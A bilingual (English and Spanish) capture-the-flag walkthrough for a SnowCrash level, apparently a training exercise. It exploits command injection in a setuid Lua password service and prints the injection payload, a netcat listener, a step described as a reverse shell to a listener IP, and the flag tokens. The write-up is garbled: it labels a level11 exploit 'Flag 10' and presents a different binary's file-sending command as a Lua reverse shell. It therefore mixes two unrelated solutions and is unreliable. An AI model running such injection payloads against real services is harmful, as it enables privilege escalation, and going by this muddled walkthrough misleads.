# Flag 10

## Tools Used:

* `ls`
* Netcat (`nc`)
* Lua scripting (code injection)
* Reverse engineering / code reading

## Process:

Upon logging into the `level11` account (actually for **flag10**, the binary is named `level11.lua`), listing the directory shows:

```bash
level11@SnowCrash:~$ ls -la
```

Key file:

```
-rwsr-sr-x 1 flag11 level11 668 Mar 5 2016 level11.lua
```

Inspecting the Lua script reveals it binds to `127.0.0.1:5151` and prompts for a password. It computes a SHA‑1 hash of your input and compares it to a decoy constant. However, it invokes the shell via:

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

This allows **command injection** by embedding shell expansions in the password prompt.

### Exploitation:

1. Connect to the service locally:

   ```bash
   level11@SnowCrash:~$ nc localhost 5151
   Password:
   ```

2. Inject a command such as `$(getflag | wall)`:

   ```
   Password: $(getflag | wall)
   ```

3. This triggers the `getflag` call under the `flag11` privileges and broadcasts the flag to all users:

   ```
   Broadcast Message from flag11@Snow
           (somewhere) at 23:44 ...

   Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

   Erf nope..
   ```

   (The script then continues to reject the password.)

4. To bypass the broadcast approach and retrieve the flag text directly, use a reverse shell technique:

   * On your local machine, start a listener on port 6969:

     ```bash
     nc -lvnp 6969
     ```

   * In another terminal on SnowCrash, run the Lua script again, injecting a reverse shell call. For example, if your listener IP is `192.168.0.4` and you have a harmless `victim.txt`:

     ```bash
     level11@SnowCrash:~$ ./level10 victim.txt 192.168.0.4
     ```

     (Repeat until you receive the desired output.)

   * Once connected, you’ll see:

     ```
     Connection received on 192.168.0.43 60888
     .*( )*.
     woupa2yuojeeaaed06riuj63c
     ```

5. Finally, switch to the `flag10` user and run `getflag` to confirm the real flag:

   ```bash
   flag10@SnowCrash:~$ getflag
   Check flag.Here is your token : feulo4b72j7edeahuete3no7c
   ```

---

# Flag 10

## Herramientas Utilizadas:

* Comando `ls`
* Netcat (`nc`)
* Scripting en Lua (inyección de comandos)
* Ingeniería inversa / lectura de código

## Proceso:

Al iniciar sesión en la cuenta `level11` (para **flag10** el script es `level11.lua`), listar el directorio muestra:

```bash
level11@SnowCrash:~$ ls -la
```

Archivo clave:

```
-rwsr-sr-x 1 flag11 level11 668 Mar 5 2016 level11.lua
```

El script Lua abre un socket en `127.0.0.1:5151`, solicita una contraseña y calcula su hash SHA‑1 con:

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

Esta llamada a `io.popen` permite **inyección de comandos** mediante expansiones de shell en la contraseña.

### Explotación:

1. Conectarse al servicio local:

   ```bash
   level11@SnowCrash:~$ nc localhost 5151
   Password:
   ```

2. Inyectar un comando, por ejemplo `$(getflag | wall)`:

   ```
   Password: $(getflag | wall)
   ```

3. Esto ejecuta `getflag` con privilegios de `flag11` y transmite la flag:

   ```
   Broadcast Message from flag11@Snow
           (somewhere) at 23:44 ...

   Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

   Erf nope..
   ```

4. Para obtener el texto directamente sin depender de `wall`, usar una técnica de shell inverso:

   * En tu máquina local, iniciar un listener en el puerto 6969:

     ```bash
     nc -lvnp 6969
     ```

   * En otra terminal de SnowCrash, volver a ejecutar el script Lua con inyección de reverse shell—por ejemplo, apuntando a tu listener (`192.168.0.4`):

     ```bash
     level11@SnowCrash:~$ ./level10 victim.txt 192.168.0.4
     ```

     (Repetir hasta recibir la salida deseada.)

   * Cuando se conecte, verás:

     ```
     Connection received on 192.168.0.43 60888
     .*( )*.
     woupa2yuojeeaaed06riuj63c
     ```

5. Finalmente, cambiar al usuario `flag10` y ejecutar `getflag` para confirmar la flag real:

   ```bash
   flag10@SnowCrash:~$ getflag
   Check flag.Here is your token : feulo4b72j7edeahuete3no7c
   ```

---

## Scripts Used:

None (injection via `nc` and shell)

## Flag:

```
feulo4b72j7edeahuete3no7c
```
